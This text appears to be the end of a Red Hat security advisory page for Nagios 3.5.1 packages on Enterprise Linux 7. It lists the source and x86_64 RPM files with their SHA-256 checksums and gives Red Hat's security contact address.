| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el7.src.rpm | SHA-256: 22be84749fe4d4876bf2252ea1ecfae60b887499272dd2c1664a3620ed20d636 |
| x86\_64 | |
| nagios-3.5.1-9.el7.x86\_64.rpm | SHA-256: 7888c2212b5be85dff6f97fdfa4518ee4b16e899e6dfc36bc83e4936f0c76400 |
| nagios-common-3.5.1-9.el7.x86\_64.rpm | SHA-256: 8e13e8b11bf94b0d3d2e0c2a9eaed02f82482a3191dbe30a40565b521f59a120 |
| nagios-debuginfo-3.5.1-9.el7.x86\_64.rpm | SHA-256: e92f087a7d2b3083f049929fd439e2a5de38cc817d5c9f1fa48c1672d4514feb |
| nagios-devel-3.5.1-9.el7.x86\_64.rpm | SHA-256: 2e9433e22f2cc9aa99111093d85b4b2b5c481f41d787a7035df5bd94003432a1 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)


